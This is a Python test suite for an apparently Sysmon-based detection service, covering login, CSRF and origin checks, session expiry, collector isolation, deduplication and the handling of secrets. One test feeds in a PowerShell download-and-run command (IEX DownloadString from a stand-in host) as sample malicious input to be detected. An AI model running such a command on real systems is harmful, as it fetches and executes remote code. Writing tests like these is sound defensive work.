"""Login, collector isolation and persistence over temporary SQLite files."""
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from fastapi.testclient import TestClient
from aegis_on import api
from aegis_on.auth_sessions import hash_password
from aegis_on.history_store import SQLiteHistory
from aegis_on.service import DetectionService
from test_sysmon_api import make_event


class CentralAuthTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(); self.addCleanup(self.tmp.cleanup)
        self.path = Path(self.tmp.name) / 'history.sqlite3'
        self.old = api.service; self.addCleanup(setattr, api, 'service', self.old)
        api.service = DetectionService(SQLiteHistory(self.path))
        env = patch.dict(os.environ, {'AEGIS_HISTORY_DB': str(self.path),
            'AEGIS_AUTH_DB': str(self.path)+'.auth', 'AEGIS_LOGIN_USERNAME': 'test-analyst',
            'AEGIS_LOGIN_PASSWORD_HASH': hash_password('synthetic-password-123'),
            'AEGIS_ANALYST_NAME': 'analyst-1', 'AEGIS_API_TOKEN':'legacy-token',
            'AEGIS_ALLOW_LEGACY_COLLECTOR_TOKEN':'0'}, clear=False)
        env.start(); self.addCleanup(env.stop)
        api._login_attempts.clear(); api._session_config.cache_clear()
        self.client = TestClient(api.app, base_url='https://testserver'); self.addCleanup(self.client.close)

    def login(self):
        r = self.client.post('/api/v1/login', json={'username':'test-analyst','password':'synthetic-password-123'})
        self.assertEqual(r.status_code, 200, r.text)
        self.assertIn('HttpOnly', r.headers['set-cookie']); self.assertIn('Secure',r.headers['set-cookie'])
        return self.client.get('/api/v1/session').json()['csrf_token']

    def test_login_logout_expiry_csrf_and_http(self):
        self.assertEqual(self.client.get('/api/v1/history').status_code, 401)
        self.assertEqual(self.client.post('/api/v1/login', json={'username':'test-analyst','password':'wrong'}).status_code,401)
        csrf=self.login()
        self.assertEqual(self.client.post('/api/v1/collectors/register',json={'collector_id':'pc-a'}).status_code,403)
        self.assertEqual(self.client.post('/api/v1/collectors/register',json={'collector_id':'pc-a'},headers={'X-CSRF-Token':csrf,'Origin':'https://evil.invalid'}).status_code,403)
        self.assertEqual(self.client.post('/api/v1/logout',headers={'X-CSRF-Token':csrf}).status_code,200)
        self.assertEqual(self.client.get('/api/v1/history').status_code,401)
        self.login(); sessions=api._sessions(); old_clock=sessions.clock; self.addCleanup(setattr,sessions,'clock',old_clock)
        sessions.clock=lambda: old_clock()+4000
        self.assertEqual(self.client.get('/api/v1/history').status_code,401)
        remote=TestClient(api.app,base_url='http://testserver'); self.addCleanup(remote.close)
        self.assertEqual(remote.get('/api/v1/history',headers={'Authorization':'Bearer legacy-token'}).status_code,403)
        self.assertEqual(remote.post('/api/v1/login',json={'username':'test-analyst','password':'synthetic-password-123'},headers={'host':'localhost'}).status_code,403)

    def test_two_collectors_identity_dedup_and_restart(self):
        csrf=self.login()
        creds={}
        for name in ('pc-a','pc-b'):
            r=self.client.post('/api/v1/collectors/register',json={'collector_id':name},headers={'X-CSRF-Token':csrf})
            self.assertEqual(r.status_code,200,r.text); creds[name]=r.json()['credential']
        self.assertEqual(self.client.post('/api/v1/collectors/register',json={'collector_id':'pc-c'},headers={'Authorization':'Bearer legacy-token'}).status_code,403)
        self.assertEqual(len(self.client.get('/api/v1/collectors').json()['collectors']),2)
        for i,name in enumerate(creds):
            h={'Authorization':'Bearer '+creds[name],'X-Collector-ID':name,'Idempotency-Key':'batch-1'}
            other='pc-b' if name=='pc-a' else 'pc-a'
            self.assertEqual(self.client.post('/api/v1/collectors/'+other+'/heartbeat',json={'state':'running'},headers=h).status_code,403)
            self.assertEqual(self.client.post('/api/v1/collectors/'+name+'/heartbeat',json={'state':'running'},headers=h).status_code,200)
            event=make_event(1,123); event['System']['Computer']='SAME-SYNTHETIC-HOST'
            if i==0: event['EventData']['CommandLine']='powershell -c IEX (New-Object Net.WebClient).DownloadString(\"https://example.invalid/a\")'
            result=self.client.post('/api/v1/ingest/sysmon',json={'events':[event]},headers=h)
            self.assertEqual(result.status_code,200,result.text)
            retry=self.client.post('/api/v1/ingest/sysmon',json={'events':[event]},headers={**h,'Idempotency-Key':'batch-2'})
            self.assertEqual(retry.status_code,200,retry.text); self.assertEqual(retry.json()['summary']['duplicate'],1)
            with TestClient(api.app, base_url='https://testserver') as unauth: self.assertEqual(unauth.get('/api/v1/history',headers={'Authorization':'Bearer '+creds[name]}).status_code,401)
        bad={'Authorization':'Bearer '+creds['pc-a'],'X-Collector-ID':'pc-b','Idempotency-Key':'forged'}
        self.assertEqual(self.client.post('/api/v1/ingest/sysmon',json={'events':[make_event()]},headers=bad).status_code,401)
        bad['X-Collector-ID']='unregistered'
        self.assertEqual(self.client.post('/api/v1/ingest/sysmon',json={'events':[make_event()]},headers=bad).status_code,401)
        api.service = DetectionService(SQLiteHistory(self.path))
        history=self.client.get('/api/v1/history').json()
        endpoints=self.client.get('/api/v1/endpoints').json()['endpoints']
        self.assertEqual(len(endpoints),2); self.assertEqual(sum(e['event_count'] for e in endpoints),2)
        self.assertGreaterEqual(len(history['detections']),1)
        self.assertEqual(sum(e['detection_count'] for e in endpoints),len(history['detections']))
        self.assertEqual(len({e['endpoint_id'] for e in endpoints}),2)
        for path in Path(self.tmp.name).iterdir():
            if path.is_file():
                raw=path.read_bytes()
                for secret in creds.values(): self.assertNotIn(secret.encode(),raw)

    def test_json_equal_identifiers_not_cross_linked(self):
        csrf=self.login()
        for i,name in enumerate(('one','two')):
            secret=self.client.post('/api/v1/collectors/register',json={'collector_id':name},headers={'X-CSRF-Token':csrf}).json()['credential']
            h={'Authorization':'Bearer '+secret,'X-Collector-ID':name,'Idempotency-Key':'batch'}
            event={'timestamp':'2026-01-01T00:00:00Z','host':'same','user':'demo','process':'curl',
                   'command_line':'powershell -enc ABCD' if i==0 else 'echo normal','event_id':'same'}
            r=self.client.post('/api/v1/ingest/json',json={'events':[event]},headers=h)
            self.assertEqual(r.status_code,200,r.text)
        history=self.client.get('/api/v1/history').json()
        self.assertEqual(len({a['source_events'][0]['event_id'] for a in history['analyses']}),2)
        endpoints=self.client.get('/api/v1/endpoints').json()['endpoints']
        self.assertEqual(len(endpoints),2)

    def test_ingested_credential_is_not_returned_or_persisted(self):
        csrf=self.login()
        secret=self.client.post('/api/v1/collectors/register',json={'collector_id':'safe-test'},headers={'X-CSRF-Token':csrf}).json()['credential']
        h={'Authorization':'bearer '+secret,'X-Collector-ID':'safe-test','Idempotency-Key':'batch'}
        event={'timestamp':'2026-01-01T00:00:00Z','host':secret,'user':'demo','process':'curl',
               'command_line':'curl '+secret,'event_id':'e1'}
        response=self.client.post('/api/v1/ingest/json',json={'events':[event]},headers=h)
        self.assertEqual(response.status_code,200,response.text)
        self.assertNotIn(secret,response.text)
        self.assertNotIn(secret,self.client.get('/api/v1/history').text)
        for path in Path(self.tmp.name).iterdir():
            if path.is_file(): self.assertNotIn(secret.encode(),path.read_bytes())


class AmbiguousIdentityTests(unittest.TestCase):
    def test_legacy_reused_event_id_does_not_link_another_collector(self):
        from aegis_on.endpoint_views import build_endpoint_groups
        batches = [
            {'analysis_id':'a1','input_type':'sysmon','detection_ids':['d1'],'source_events':[{'event_id':'same','host':'h1','endpoint_group':'pc1'}]},
            {'analysis_id':'a2','input_type':'sysmon','detection_ids':[],'source_events':[{'event_id':'same','host':'h2','endpoint_group':'pc2'}]},
        ]
        groups=build_endpoint_groups(batches,[{'detection_id':'d1','event_ids':['same']}])
        self.assertEqual([len(g['detections']) for g in groups],[1,0])

    def test_console_ambiguous_legacy_links_are_not_combined(self):
        import shutil, subprocess
        if not shutil.which('node'): self.skipTest('Node.js required')
        code = r"""
const fs=require('fs'),vm=require('vm'),assert=require('assert');
let s=fs.readFileSync('static/console.html','utf8');
let functions=s.slice(s.indexOf('function isUnambiguous'),s.indexOf('function evidencePanel'));
let context={};vm.createContext(context);vm.runInContext(functions,context);
let a={analysis_id:'a',detection_ids:['d'],source_events:[{event_id:'same',endpoint_group:'p1'}]};
let b={analysis_id:'b',detection_ids:[],source_events:[{event_id:'same',endpoint_group:'p2'}]};
let det={detection_id:'d',event_ids:['same']},data={analyses:[a,b]};
assert.equal(context.linkedEvents(data,det).source_events.length,1);
assert.equal(context.eventLinked(data,b,det,b.source_events[0]),false);
"""
        r=subprocess.run(['node','-e',code],capture_output=True,text=True)
        self.assertEqual(r.returncode,0,r.stderr)
